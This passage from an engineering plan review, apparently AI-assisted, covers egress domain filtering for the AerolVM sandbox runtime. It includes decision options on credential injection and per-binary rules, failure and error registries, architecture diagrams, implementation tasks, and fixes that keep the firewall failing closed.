| Phase 3 demand gate | plan §5.9 | gated | unchanged | unchanged | unchanged |

Question: D6 — X5: Commit proxy-side credential injection (secrets never enter the sandbox) as a Phase 3 deliverable?
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: E2B now lets a sandbox hold a fake placeholder token while its egress proxy swaps in the real secret on the way out, so a hijacked agent can't steal the key. Our plan mentions this only as an optional Phase 3 idea. It needs the proxy to decrypt HTTPS for those hosts, which is the same machinery as Phase 3's method/path rules, plus the sealed secrets this repo already has. The question is whether to commit to it as part of Phase 3, which stays gated on demand.
Stakes if we pick wrong: committing ties Phase 3 to a high-risk TLS interception feature; leaving it optional cedes a security feature E2B already sells.
Recommendation: Defer to TODOS.md because Phase 3 itself waits for demand, and the TODO keeps the E2B parity gap visible without pre-committing TLS interception.
Note: options differ in kind, not coverage — no completeness score.
Net: E2B security parity, against committing early to the riskiest machinery in the design.
Header: Cred inject
A) Add to this plan's scope
§5.9 makes credential injection a committed Phase 3 deliverable: per-host rules `{host, inject: {header, secret_ref}}`, sealed with `pkg/secrets`, swapped at the proxy after TLS termination; placeholders only inside the sandbox. Phase 3 stays demand-gated. Effort L (human ~3 weeks / CC ~3 days when Phase 3 starts); risk high (TLS interception, CA trust, pinned clients). ✅ Matches E2B's strongest egress security feature ✅ A hijacked agent cannot exfiltrate keys it never had ❌ Commits Phase 3 to TLS interception, the riskiest piece of the design
B) Defer to TODOS.md (recommended)
TODOS.md entry recording the E2B parity gap and the design sketch; §5.9 keeps it as optional. Effort S (zero implementation work now); risk low. ✅ No commitment to TLS interception before demand exists ✅ The parity gap stays visible to whoever picks up Phase 3 ❌ E2B keeps a security feature we can't match yet
C) Skip
Remove credential injection from §5.9; NOT in scope with the reason. Effort S (zero implementation work); risk low. ✅ Phase 3 stays purely about method/path rules ✅ No secret handling inside the proxy ever ❌ Gives up a differentiating security feature entirely

## currentDecision (X6)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X6 per-binary attribution | pending | not in plan | Add as a Phase 3 item | TODOS.md entry | not planned; NOT in scope |

Question: D7 — X6: Add per-binary egress rules (only /usr/bin/pip may reach pypi.org), like OpenShell?
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: NVIDIA's OpenShell can say "only this program may reach this host". To do that, the host has to know which process inside the sandbox opened each connection. In our runtimes the code inside is untrusted and may run as root: it can copy curl to /usr/bin/pip or inject into the allowed program. So the host can't verify the binary's identity, and a per-binary rule mostly gives a false sense of safety for exactly the code we are containing.
Stakes if we pick wrong: building it costs a lot for a check untrusted code can fake; never recording it hides a feature buyers compare against.
Recommendation: Skip because the binary identity can't be trusted against root inside the sandbox, so the rule would not hold against the code it exists to stop.
Note: options differ in kind, not coverage — no completeness score.
Net: a feature-checklist match, against a boundary untrusted code can walk around.
Header: Per-binary
A) Add to this plan's scope
New Phase 3 item: map each proxied or forwarded connection to its process (via the sandbox's netns /proc socket inodes or eBPF cgroup hooks) and allow rules keyed by executable path. Effort XL (human ~4 weeks / CC ~1 week); risk high (identity forgeable by root in the sandbox; differs per runtime; impossible from the host for microVMs). ✅ Matches an OpenShell feature buyers may compare against ✅ Useful for trusted workloads that want least privilege per tool ❌ Untrusted root code can fake the binary, so it is not a real boundary
B) Defer to TODOS.md
TODOS.md entry recording the feature, the forgeability problem and the runtimes where it could hold. Effort S (zero implementation work now); risk low. ✅ Keeps the comparison visible for later product decisions ✅ No engineering spent on a weak boundary now ❌ A TODO for something that may never be a sound boundary
C) Skip (recommended)
Not planned; NOT in scope with the reason (binary identity is forgeable by root inside the sandbox). Effort S (zero implementation work); risk low. ✅ No investment in a check untrusted code can defeat ✅ Keeps the boundary story honest: hostname, DNS and port are the enforced facts ❌ A competitor feature stays unmatched in comparisons

## CEO review outputs (2026-10-06)

### NOT in scope (CEO review)

Deferred to TODOS.md: none.

Not taken, or kept out by answer:
- **Ask-to-allow approval flow.** Offered on request; not taken up.
- **Live `aerolvm egress allow` CLI verb.** Offered on request; not taken up.
- **IPv6 filtering.** IPv6 bridges refuse gateway mode instead (D18).
- **Firecracker before Phase 4.** Kept in Phase 4 (D14).
- **Phase 3 inspection and injection for WASM and Firecracker.** Stays
  unspecified (D14).
- **Scheduled built-in-profile freshness job.** Declined in D12 (accepted
  shortcut).

### What already exists (additions to the eng table)

| Existing piece | Location | Reuse |
|---|---|---|
| `connLimiter` | `internal/service/l4proxy.go:80-135` | moved to `internal/netsplice` (D17) |
| Capacity heartbeat (sandbox-owning nodes) | `internal/cluster/capacity_lease.go:489` | carries `egress_gateway_ready` (D20) |
| Worker `owned-recovery` poll | `internal/cluster/agent.go` | same pattern for the profile cache (D19) |
| OTEL + expvar exporter | `internal/observability/` | gateway spans and metrics (D24) |
| Grafana dashboards, Prometheus alerts, runbooks | `setup/grafana/`, `setup/prometheus/`, `setup/runbooks/` | D22/D24 panels, alerts, runbooks |
| `isStoredSpecReplay` intake relaxation | `internal/service` | replay holds instead of refusing (D16) |
| Netns slot pool | `internal/network/netns/pool.go` | owner checks (D5, D20 eng) |

### Dream state delta

After Phases 0-2, AerolVM reaches the "provable containment" ideal for docker,
containerd, gVisor, WASM and isolate:
- hostname allowlists with DNS that only resolves allowed names;
- learn-then-lock policies, and pinned built-in profiles;
- every gateway-mode denial fails fast with a reason;
- tamper-evident audit of allowed and denied egress;
- fail-closed holds that survive restarts, table flushes and races;
- live policy updates.

Remaining gap to the ideal:
- Firecracker (Phase 4);
- L7 method/path rules, credential injection and per-binary rules (Phase 3,
  specified, gated on demand);
- IPv6;
- an ask-to-allow flow.

### Error & Rescue Registry

| Method / codepath | Failure | Error class | Rescued | Action | User sees |
|---|---|---|---|---|---|
| `Gateway.Attach` (UDS) | gateway down, skew, nft batch | ErrGatewayUnavailable, ErrProtoSkew, ErrNftApply | Y | hold (D16), metric, reconcile retry; 503 on create | 503 or `egress_status:"unavailable"` |
| `Gateway.SetBlocked` / `Detach` | gateway down | ErrGatewayUnavailable | Y | restart is blocked until `Sync`; `Sync` is the full desired state | nothing (fail closed) |
| `Gateway.Sync` | invalid payload, nft batch | ErrSyncInvalid, ErrNftApply | Y | keep current sets; hold affected sandboxes; retry | status |
| `dnsfilter.Serve` | upstream timeout | ErrUpstreamTimeout | Y | 2 s per upstream, next upstream, then SERVFAIL | DNS failure |
| `dnsfilter.Serve` | unknown source / QPS / learned cap / not allowed | policy | Y | REFUSED or NXDOMAIN + EDE 15 + audit | explained DNS error |
| `proxy.Accept` | over cap | policy | Y | `access_denied` alert without reading the hello; audit `conn_cap` | TLS alert / 429 |
| `proxy.Peek` | too large, timeout, malformed | ErrHelloTooLarge, ErrHelloTimeout, ErrHelloMalformed | Y | alert + audit; fuzzed (EF-71) | TLS alert |
| `proxy.Dial` | resolve fail, blocked IP, timeout | ErrResolve, ErrBlockedIP, ErrDialTimeout | Y | alert or close + audit | TLS alert / connection error |
| `UpdateNetworkPolicy` | spec commit, apply | ErrSpecCommit, ErrApplyHeld | Y | 503 `spec_commit_failed` (nothing changed) / 503 `apply_failed_held` (held) | 503 with reason |
| Profile fan-out | re-apply fails | ErrApplyHeld | Y | hold + `aerolvm_egress_profile_apply_failed_total` + reconcile | status |
| Profile PUT/DELETE | in use, cap, version gate | ErrProfileInUse, ErrProfileCap, ErrClusterVersion | Y | 409 / 409 / 503 | clear error |
| Self-test / table check | probe fails, table lost | ErrSelfTest, ErrTableLost | Y | node unavailable (501) / hold + rebuild + alert | 501 / brief shut window |
| Snapshot write | disk full, fsync | ErrSnapshotWrite | Y | log + `aerolvm_egress_snapshot_errors_total`; `Sync` stays authoritative | nothing |
| Gateway socket | non-sandboxd peer | ErrPeerRejected | Y | reject + log (D22) | n/a |

### Failure Modes Registry

| Codepath | Failure mode | Rescued | Test | User sees | Logged |
|---|---|---|---|---|---|
| Limits PATCH on a held sandbox | quota code clears the DROP | Y (D16) | EF-64 | stays shut | Y |
| Transition on a quota-blocked sandbox | ClearBlockAll | Y (D16) | EF-64 | stays blocked | Y |
| Gateway restart with a stale snapshot | blocked sandbox proxied | Y (D16) | EF-64 | stays blocked | Y |
| `nft flush ruleset` | table lost | Y (D17) | EF-65, EF-72 | brief shut, then restored | Y + alert |
| Bridged sandbox-to-sandbox traffic | skips hooks | Y (D18) | EF-58 | filtered | Y |
| Privileged or IPv6 node | isolation can't hold | Y (D18) | EF-58 | 501 | Y |
| Create racing a profile delete | orphaned reference | Y (D19) | EF-61 | 409 | Y |
| Mixed cluster | create on an incapable node | Y (D20) | EF-66 | routed elsewhere / 503 | Y |
| Custom docker network | no DNS | Y (D21) | EF-67 | works | Y |
| Hostile socket peer | unauthorized unblock | Y (D22) | EF-68 | n/a | Y |
| Malformed hello or DNS packet | parser crash | Y (D23) | EF-71 | alert / FORMERR | Y |
| Attach vs quota race | re-redirect | Y (serialization) | EF-69 | stays blocked | Y |
| INPUT-DROP host | silent total outage | Y (self-test) | self-test unit | 501 | Y |

CRITICAL GAPS: **0**.

### Scope Expansion Decisions

The full record is the CEO plan's 0G scope table
(`~/.gstack/projects/aerol-ai-microvm/ceo-plans/2026-10-06-egress-domain-filtering.md`).
- **Accepted:** X1 learn mode, X2 built-in profiles, X3 explainable denials, X4
  policy check endpoint, X5 credential injection (Phase 3), X6 per-binary rules
  (Phase 3).
- **Deferred:** none.
- **Skipped:** none. Four further candidates were offered on request and not
  taken up.

### Diagrams

1. **System architecture**: plan §5.2 data path and the eng "Diagrams" control
   plane, both current, plus:

```
 sandboxd ──UDS (SO_PEERCRED, N/N-1, OTEL ctx)──► egress-gateway (aerolvm-egress user, CAP_NET_ADMIN)
   │  store: egress_hold, policy, profiles refs              │ nft inet aerolvm_egress (+ learn_flows, rejected_flows)
   │  cluster: FSM profiles + ref index, capacity           │ dnsfilter ─ proxy ─ netsplice(connLimiter)
   │  heartbeat egress_gateway_ready, placement filter      │ heartbeat: table check, counters, audit stream
   └─ metrics/alerts/dashboards (D22, D24)                  └─ snapshot (no secrets)
```

2. **Data flow with shadow paths**:

```
DNS:  query ─► redirect ─► bySrc? ──no──► REFUSED
                             │yes
                     blocked? (not redirected; DOCKER-USER DROP)
                     QPS ok? ──no──► REFUSED+EDE15
                     allowed? ──no──► NXDOMAIN+EDE15+audit (allowlist mode) / forward (deny-list, learn)
                     upstream ──timeout──► next ──all fail──► SERVFAIL
                     answer ─► private-range filter ─► learned insert (cap? ──full──► REFUSED+EDE "learned cap")
HTTPS: conn ─► cap? ──over──► access_denied (no read)
            ─► peek (≤16 KB, 5 s) ──bad──► access_denied+audit
            ─► SNI? ──none──► allowlist: deny | deny-list/learn: dial original dst
            ─► match ──no──► access_denied+audit
            ─► dial (dial control) ──blocked/timeout──► alert/close+audit
            ─► splice (half-close aware) ─► policy narrowed ──► registry closes
```

3. **State machine** (`egress_status`):

```
 create(gateway) ─► held ──Attach ok──► attached(enforce|learn) ──PUT/profile──► attached′
                     ▲  │                    │ quota/block_all          │
   Attach fail ──────┘  │                    ▼                          │
   table lost / Noop    │                blocked ──unblock+Attach ok────┘
   missing builtin      └──destroy──► detached (owner-checked)
 forbidden: held→attached without Attach; blocked→attached via limits PATCH (D16)
```

4. **Error flow**:

```
 any Attach failure ─► hold (sbx-egress-hold, egress_hold=1) ─► metric + SandboxdEgressAttachFailures
                    ─► reconcile retry (5 min) / Sync on reconnect ─► Attach ok ─► hold cleared
```

5. **Deployment sequence**:

```
 binary ─► install/Terraform/Ansible: aerolvm-egress user + unit ─► unit start
        ─► table create (add-only) ─► per-bridge self-test (sandboxd probe) ─► gateway_up=1
        ─► capacity heartbeat egress_gateway_ready ─► placement routes gateway-mode creates
 cluster: profile writes enabled only when every member's version ≥ N
```

6. **Rollback flowchart**:

```
 problem ─► SB_EGRESS_FQDN_ENABLED=false ─► gateway-mode creates 501, existing sandboxes held (closed)
        ─► roll binary back (old ignores egress_hold column and unknown FSM ops)
        ─► Phase 0 regressions: revert the stack ─► per node ~15 min
```

### Stale Diagram Audit

- Plan §5.2 data path: updated in this review; accurate.
- Eng "Diagrams" control plane and FQDN create flow: accurate.
- Eng "Policy PUT flow": was stale (showed block-all on apply failure); updated
  to the D16 hold.
- CEO 0C dream state: accurate.
- Repo files the plan touches:
  - `internal/service/l4proxy.go` `spliceConns` doc comment: must be rewritten
    with the half-close semantics when it moves to `internal/netsplice` (T1).
  - `internal/network/hostport/forwarder.go` chain diagram: unchanged by this
    plan.

### Implementation Tasks (CEO review)
Synthesized from this review's findings. Each task derives from a specific
finding above. Run with Claude Code or Codex; checkbox as you ship.
Effort ratios assumed: features ~30x, bug fix with regression ~20x, tests
~50x, architecture ~5x (human ÷ CC).

- [ ] **T31 (P1, human: ~3 days / CC: ~3h)** — service + netrules + store — Persisted fail-closed hold
  - Surfaced by: Section 1 — C-HOLD (`internal/service/netstats.go:128,179`), CEO D16
  - Files: `internal/store/store.go`, `internal/service/`, `pkg/docker/netrules/`, `internal/egress/`
  - Verify: EF-64
- [ ] **T32 (P1, human: ~1 day / CC: ~1h)** — internal/egress — Table-loss detection, hold and rebuild
  - Surfaced by: Section 1 — C-NFT, CEO D17
  - Files: `internal/egress/nft.go`, `internal/egress/heartbeat.go`, `setup/prometheus/sandboxd-alerts.yml`
  - Verify: EF-65
- [ ] **T33 (P1, human: ~1 day / CC: ~1h)** — gateway bootstrap — Node preconditions (br_netfilter, privileged, IPv6)
  - Surfaced by: Section 1 — C-NODE, CEO D18
  - Files: `internal/network/hostnet/`, `internal/egress/`, `pkg/daemon/`
  - Verify: EF-58
- [ ] **T34 (P2, human: ~4 days / CC: ~4h)** — internal/cluster — FSM profile reference index, apply-time checks, worker forwarding, version gate
  - Surfaced by: Section 1 — C-PROF, CEO D19; Section 9 rolling-upgrade gate
  - Files: `internal/cluster/fsm.go` (+ `fsm_*_test.go`), `internal/cluster/agent.go`, `internal/service/`
  - Verify: EF-61; the cluster regression tests
- [ ] **T35 (P2, human: ~3 days / CC: ~3h)** — internal/cluster — Capability-aware placement
  - Surfaced by: Section 1 — C-PLACE, CEO D20
  - Files: `internal/cluster/placement.go`, `internal/cluster/placement_test.go`, `internal/cluster/capacity_lease.go`
  - Verify: EF-66
- [ ] **T36 (P2, human: ~1 day / CC: ~1h)** — internal/egress — Bind on `SB_DOCKER_NETWORK`'s bridge
  - Surfaced by: Section 1 — C-DNET, CEO D21
  - Files: `internal/egress/bootstrap.go`, `integration-tests/suite/`
  - Verify: EF-67
- [ ] **T37 (P1, human: ~1 day / CC: ~1h)** — gateway unit + egress — Process hardening
  - Surfaced by: Section 3 — C-HARD, CEO D22
  - Files: `packaging/`, `scripts/install.sh`, `Terraform/`, `Ansible/`, `internal/egress/uds.go`
  - Verify: EF-68
- [ ] **T38 (P2, human: ~1 week / CC: ~1 day)** — tests — Fuzz targets, chaos UCs, load baselines
  - Surfaced by: Section 6 — C-VERIFY, CEO D23
  - Files: `pkg/egresspolicy/*_fuzz_test.go`, `internal/egress/*_fuzz_test.go`, `integration-tests/suite/`
  - Verify: EF-71..EF-73
- [ ] **T39 (P2, human: ~3 days / CC: ~3h)** — setup + observability — Operability package
  - Surfaced by: Section 8 — C-OPS, CEO D24
  - Files: `setup/grafana/`, `setup/runbooks/`, `setup/prometheus/sandboxd-alerts.yml`, `internal/observability/`
  - Verify: dashboards load; alert rule tests; trace spans present across the UDS
- [ ] **T40 (P2, human: ~1h / CC: ~10min)** — config — `SB_EGRESS_FQDN_ENABLED` default true + rationale
  - Surfaced by: Section 9 — C-FLAG, CEO D25
  - Files: `internal/config/config.go`, `setup/config-defaults.md`
  - Verify: config default test
- [ ] **T41 (P1, human: ~1 day / CC: ~1h)** — sandboxd + egress — Per-bridge self-test mechanism (sandboxd-run probe, link-local /32, re-run triggers)
  - Surfaced by: spec review 3 F1; C-HARD split of privilege
  - Files: `internal/egress/selftest.go`, `pkg/daemon/`
  - Verify: a fresh containerd node passes after `aerolvm0` appears
- [ ] **T42 (P1, human: ~1 day / CC: ~1h)** — internal/egress — Dynamic sets for learn recording and firewall-reject audit
  - Surfaced by: spec review 3 F3 and C9
  - Files: `internal/egress/nft.go`, `internal/egress/audit.go`
  - Verify: EF-70
- [ ] **T43 (P1, human: ~3h / CC: ~20min)** — dnsfilter — Private-range guard on learned IPs
  - Surfaced by: spec review 3 C5
  - Files: `internal/egress/dnsfilter/`
  - Verify: allowlisted `host:port` resolving to 10.x is not inserted unless CIDR-allowed
- [ ] **T44 (P1, human: ~3h / CC: ~20min)** — egresspolicy + isolate — Strict dial-control mode for isolate; port semantics
  - Surfaced by: spec review 3 K2, L3
  - Files: `pkg/egresspolicy/dial.go`, `pkg/isolate/egress.go`, `pkg/wasm/worker/netmediator.go`
  - Verify: EF-45 port rows; isolate private-range test unchanged
- [ ] **T45 (P1, human: ~1 day / CC: ~1h)** — wasm — P0-1 block-all at create; 501 for lists until P1-6
  - Surfaced by: spec review 3 L6 (task coverage)
  - Files: `internal/service/wasm.go`, `internal/runtime/wasm/`
  - Verify: EF-20
- [ ] **T46 (P1, human: ~3h / CC: ~20min)** — isolate — P0-3 validation through `pkg/egresspolicy` (after P1-1)
  - Surfaced by: spec review 3 L6, K3
  - Files: `internal/service/isolate.go`
  - Verify: EF-45
- [ ] **T47 (P1, human: ~3h / CC: ~20min)** — events — P0-4 re-apply egress on docker start
  - Surfaced by: spec review 3 L6
  - Files: `pkg/docker/events.go`, `internal/service/events.go`
  - Verify: EF-59
- [ ] **T48 (P1, human: ~1 week / CC: ~1 day)** — dnsfilter + proxy — P1-3 and P1-4 cores
  - Surfaced by: spec review 3 L6
  - Files: `internal/egress/dnsfilter/`, `internal/egress/proxy/`
  - Verify: EF-01..EF-12
- [ ] **T49 (P1, human: ~3 days / CC: ~3h)** — service — P1-5 chokepoint, driver-facing copy, attach and detach at every lifecycle site
  - Surfaced by: spec review 3 L6
  - Files: `internal/service/`
  - Verify: EF-14, EF-15, EF-31
- [ ] **T50 (P1, human: ~2 days / CC: ~2h)** — wasm — P1-6 mediator policy + SNI check
  - Surfaced by: spec review 3 L6
  - Files: `pkg/wasm/worker/`, `internal/runtime/wasm/`
  - Verify: EF-21
- [ ] **T51 (P1, human: ~1 day / CC: ~1h)** — audit — P1-7 denied-egress audit (Result/Reason)
  - Surfaced by: spec review 3 L6
  - Files: `internal/service/secret_audit.go`, `pkg/isolate/egress.go`
  - Verify: denials appear in `GET /v1/sandboxes/{id}/audit`
- [ ] **T52 (P1, human: ~2 days / CC: ~2h)** — docs — P1-8 egress docs page (five-language tabs) + network-isolation limitation rewrite
  - Surfaced by: spec review 3 L6
  - Files: `docs/src/content/docs/egress-domain-filtering.mdx`, `docs/src/content.config.ts`, `docs/src/content/docs/network-isolation.mdx`
  - Verify: `make docs-build`
- [ ] **T53 (P2, human: ~1 week / CC: ~1 day)** — api + SDKs — P2-1/P2-2 PUT `/network/policy` and 5 SDK methods
  - Surfaced by: spec review 3 L6
  - Files: `pkg/api/v1/`, `internal/service/`, `sdk/*`
  - Verify: EF-27..EF-30

### CEO Completion Summary

```
  +====================================================================+
  |            MEGA PLAN REVIEW — COMPLETION SUMMARY                   |
  +====================================================================+
  | Mode selected        | SELECTIVE EXPANSION                         |
  | System Audit         | WASM block-all unenforced; host INPUT open;  |
  |                      | IP reuse races; FC NAT TODO partly stale     |
  | Step 0               | SELECTIVE (D1); 6 add-ons accepted (D2-D7); |
  |                      | spec loop 3 rounds, choices D8-D14; docs D15 |
  | Section 1  (Arch)    | 6 issues found (D16-D21) + 9 fixes          |
  | Section 2  (Errors)  | 14 error paths mapped, 0 GAPS (4 specified) |
  | Section 3  (Security)| 7 threats, 1 High resolved (D22)            |
  | Section 4  (Data/UX) | 6 edge cases mapped, 0 unhandled (1 race)   |
  | Section 5  (Quality) | 2 issues found                              |
  | Section 6  (Tests)   | Diagram produced, 16 gaps closed (EF-59..73)|
  | Section 7  (Perf)    | 0 issues found                              |
  | Section 8  (Observ)  | 1 gap found (D24)                           |
  | Section 9  (Deploy)  | 2 risks flagged (FSM skew, flag default)    |
  | Section 10 (Future)  | Reversibility: 4/5 internals, 2/5 public APIs; debt items: 4 |
  | Section 11 (Design)  | SKIPPED (no UI scope)                       |
  +--------------------------------------------------------------------+
  | NOT in scope         | written (6 items)                           |
  | What already exists  | written                                     |
  | Dream state delta    | written                                     |
  | Error/rescue registry| 14 rows, 0 CRITICAL GAPS                    |
  | Failure modes        | 13 total, 0 CRITICAL GAPS                   |
  | TODOS.md updates     | 0 items proposed                            |
  | Scope proposals      | 6 proposed, 6 accepted (SEL)                |
  | CEO plan             | written                                     |
  | Outside voice        | codex unavailable (model_unusable);         |
  |                      | native fallback unavailable                 |
  | Lake Score           | 10/12 recommendations chose complete option |
  | Diagrams produced    | 6 (arch, data flow, state, error, deploy,   |
  |                      | rollback)                                   |
  | Stale diagrams found | 2 (PUT flow fixed; spliceConns comment → T1)|
  | Unresolved decisions | 0                                           |
  +====================================================================+
```

### Unresolved Decisions (CEO review)

None. Every CEO question D1-D25 has an answer.


# Eng re-review: `/plan-eng-review` 2026-10-06 (after the CEO review)

Target: `plans/egress-domain-filtering.md` (this file, as amended by CEO
D1-D25). Reviewer: Claude (plan-eng-review). Branch: `fix/go-race-coverage-tests`.

## Eng re-review scope record

- Feature answers: none asked; no cuts proposed.
- Structure: resolved by exact prior answers: eng D3 (four packages), eng D9
  (separate process), eng D12 (`internal/netsplice`). There is no structure
  question.
- Accepted scope: the plan as amended through CEO D25.
- Pending remedies: none (E1 → D1, E2 → D2).
- Scope Challenge result: scope accepted as-is.
- Prior learning applied: capacity-lease-skips-server-voters (confidence 9/10,
  2026-10-03).

Factual corrections and contract repairs applied without a question:
- **S2:** stale `ClearBlockAll`, boot-path and Q7 text updated to D16 and D20.
- **S3:** the D16 hold also marks the sandbox blocked in the gateway, so the
  redirect path is shut too. This repairs D16's own "keep it shut" contract.
- **S4:** the §5.2 diagram said learn mode records by conntrack polling.
  Updated to the `@learn_flows` dynamic set (F3).
- **S5:** the gateway runs unprivileged (D22), so three things move.
  - Bridge discovery moves to sandboxd.
  - The self-test probe client is sandboxd's.
  - The root-owned 0600 socket comes from a systemd socket unit.
  The approved D22 and D21 behavior is unchanged.
- **S6:** §5.8's failure rule and profile fan-out said "block-all". Both now
  say "held", per D16.
- **S7 (Section 2, code quality):** learn recording and suggestion logic was
  unplaced across three runtimes. It is now one `pkg/egresspolicy.Recorder`
  (D3 package layout), with EF-76.
- **S8:** §8's failure-path and cluster text were stale against D16 and D20.
  Capability-aware placement is now listed as P1-16, since Phase 1
  gateway-mode creates need it in cluster mode.
- **S10 (Section 4, P1 fail-open, applied as a contract repair):** in nft, a
  dynamic-set `update` on a full set returns `NFT_BREAK` and skips the rest of
  its rule. The §5.5 audit insert shared a rule with the reject, so one
  scanning sandbox could fill `@rejected_flows` and turn every sandbox's
  denials on the node into accepts.
  - The insert is now its own verdict-less rule.
  - It has an explicit size, a per-source meter and an overflow counter.
  - EF-77 covers it.

  This restores the approved fail-closed contract (G7, CEO D10). It adds no
  behavior.
- **S11 (Section 4, performance):** the gateway unit sets `LimitNOFILE=131072`
  (about 6 fds per proxied connection × the 16384 node cap).
- **S9 (Section 4, performance):** the debounced gateway snapshot would
  rewrite every recording on any change, about 100 MB per 5 s at density. It
  is split into per-sandbox recording files, with EF-76.

## Eng re-review: sections 1-4

**Section 1, Architecture.**
- E1 → D1: the version gate uses a gossip `fv` field plus a size test.
- E2 → D2: blocking uses the gateway-owned `@blocked_src` set.
- S3 and S5 are contract repairs.

**Section 2, Code quality.** S7: one `pkg/egresspolicy.Recorder` for learn
mode across three runtimes.

**Section 3, Tests.**
- Rows added: EF-74 (D1), EF-75 (S5), EF-76 (S7, S9) and EF-77 (S10).
- Rows rewritten: EF-13, EF-64 and EF-69 (D2, S3).
- The test plan artifact is updated:
  `~/.gstack/projects/aerol-ai-microvm/sumansaurabh-fix-go-race-coverage-tests-eng-review-test-plan-20261006-041527.md`.

**Section 4, Performance.**
- S9: per-sandbox recording files, avoiding about 100 MB per 5 s of
  rewrites.
- S10: a P1 fail-open found while checking the 2 s set reads. The nft
  dynamic-set `NFT_BREAK` skipped the reject.
- S11: `LimitNOFILE`.
- No N+1 or store access was added on the data path. Profile gate checks
  read at most `MaxServerTierNodes` = 7 gossip entries per profile write.

Coverage of this review's new codepaths:

```
CODEPATH (this review)                         TEST                          STATUS
D1  profile write → version gate
    ├─ all Raft servers fv ≥ N → accept        EF-74 FSM test               planned
    ├─ live old server → 503                   EF-74                        planned
    ├─ failed server, old last-known meta → 503 EF-74                       planned
    ├─ server absent from gossip → 503         EF-74                        planned
    └─ nodeMeta at max field lengths < 512 B   EF-74 gossip size test       planned (regression, 512 B trap)
D2  SetBlocked(reason, on)
    ├─ block-all / quota / hold add @blocked_src EF-13, EF-64               planned
    ├─ quota unblock with block-all set → stays EF-13                       planned
    ├─ DROP insert fails → still shut          EF-64                        planned
    ├─ Attach vs quota race, both orders       EF-69 pause points           planned
    └─ gateway restart: in-memory block only;
       long CIDR flow survives                 EF-64                        planned
S3  failed PUT on attached sandbox → redirect
    path denied                                EF-64                        planned
S5  bridge list from sandboxd; bind from
    snapshot while sandboxd down               EF-75                        planned
    socket via systemd socket unit             EF-68                        planned
S7  Recorder shared by gateway/WASM/isolate    EF-76 table test             planned
S9  per-sandbox recording files rewritten
    only when changed                          EF-76 gateway unit           planned
S10 full @rejected_flows → reject still fires  EF-77 real-kernel netns      planned (integration tag)
    verdict-less update rule shape             EF-77 backend fake           planned
S11 LimitNOFILE in unit                        unit-file assertion (T37)     planned
```

No gaps remain among this review's new codepaths. Each one maps to a
planned EF row and task.

## Eng re-review decision ledger

### E1: Version signal for the profile-write upgrade gate
Finding: E1, P1, confidence 9/10, reviewer plan-eng-review (Claude).
- The plan (§5.8 "Rolling-upgrade gate") accepts profile writes only once
  every cluster member reports a version that understands them. No member
  version is reported anywhere in `internal/cluster` (grep: none).
- The capacity lease can't carry it: it is pulled only from sandbox-owning
  members (`internal/cluster/capacity_lease.go:489`; prior learning), so
  server-only voters never report.
- SWIM `nodeMeta` (`internal/cluster/gossip.go:26`) reaches every member but
  has a hard 512-byte limit. Exceeding it once stripped `RaftAddr` and broke
  voter auto-join (comment at `gossip.go:18-25`).
Plan baseline: Section 9 gate, added under D19 with no mechanism.
Runtime evidence: code read.
Comparison grid:

| Choice | Current | A | B |
|---|---|---|---|
| E1 version signal | none | a tiny `FSMOpsVersion` field (`"fv"`, int, omitempty) in `nodeMeta`; a regression test asserts the encoded meta stays under 512 bytes with every field at its maximum length | the leader polls each member's existing cluster-internal mTLS endpoint for a `/internal/version` response before accepting a profile write, cached 30 s |

Question D1:
D1 — How should cluster members advertise that they understand the new profile operations?
Project/branch/task: eng re-review of plans/egress-domain-filtering.md (cluster upgrade gate), branch fix/go-race-coverage-tests.
ELI10: During a rolling upgrade, old nodes silently skip cluster log entries they don't understand, so profile writes must wait until every node is upgraded. The plan says "wait until every member reports its version", but nothing reports versions today. The cheapest channel, gossip metadata, reaches every node but has a hard 512-byte limit that already broke voter joining once when it overflowed. The other option is to ask each node directly over the existing internal mTLS connection before accepting a profile write.
Stakes if we pick wrong: overflowing gossip metadata can break cluster membership; per-write polling adds latency and RPC fan-out to profile writes.
Recommendation: Gossip field with a size test because a two-byte integer barely moves the blob, the regression test pins the 512-byte limit, and every node learns it for free.
Completeness: A=10/10, B=9/10
Net: a tiny gossip field guarded by a test, or explicit polling with no size risk.
Header: Version gate
Options:
A) Gossip field + size test (recommended)
Add `FSMOpsVersion int json:"fv,omitempty"` to `nodeMeta`; the leader accepts profile writes only when every live member's `fv` is at least the profile-ops version. A regression test encodes `nodeMeta` with every field at its maximum length and asserts it stays under memberlist's 512 bytes. CLAUDE.md rule 6 call-out. Effort S (human ~3h / CC ~20min); risk medium (gossip metadata). ✅ Every member, including server-only voters, advertises it with no extra RPC ✅ The size test turns the known 512-byte trap into a CI failure ❌ Touches gossip metadata, the area that broke voter auto-join before
B) Poll the internal endpoint
New `/internal/version` on the existing cluster-internal mTLS endpoint; the leader polls every member before accepting a profile write, caching results for 30 s. Effort M (human ~1 day / CC ~1h); risk low. ✅ No change to gossip metadata at all ✅ Uses an authenticated channel every member already has ❌ Profile writes wait on fleet-wide polling (2000 nodes) when the cache is cold

State: approved
Actual answer: "Gossip field + size test (recommended)" (eng re-review D1, 2026-10-06)
Accepted scope: option A exactly. Applied to the §5.8 "Rolling-upgrade gate" body.
"Every live member" was made precise as "every Raft server, including failed ones by last-known meta" (a mechanic of the chosen gate: a failed old voter replays the log).
History: pending → approved (D1)

### E2: Taking a blocked sandbox out of the redirect set relies on cross-process ordering
Finding: E2, P1, confidence 8/10, reviewer plan-eng-review (Claude), Section 1.
- §5.3 "Invariant" blocks a gateway-mode sandbox by removing its IP from
  `@fqdn_src`. It then relies on `DOCKER-USER`'s DROP (block-all, quota, or the
  D16 hold) to catch everything.
- Once the IP leaves `@fqdn_src`, none of the `aerolvm_egress` chains match it
  any more. In FQDN mode netrules installs no `sbx-egress` rules (§5.2).
- The plan states no order between the two firewalls, which live in two
  processes.
- Three paths open a window of unfiltered egress:
  - **Quota unblock:** sandboxd clears the shared DROP
    (`netstats.go:179`) before the gateway re-adds the IP.
  - **Hold:** `SetBlocked(true)` lands before the hold DROP is inserted, or
    the insert fails.
  - **Gateway restart:** "restores its snapshot with every sandbox blocked"
    is read as removing IPs from the set.
Plan baseline: §5.3 invariant + D16 hold, with no ordering rule.
Runtime evidence: code read (`netstats.go:128,179`; plan §5.2 chains are
all `ip saddr ∈ @fqdn_src`-scoped).
Comparison grid:

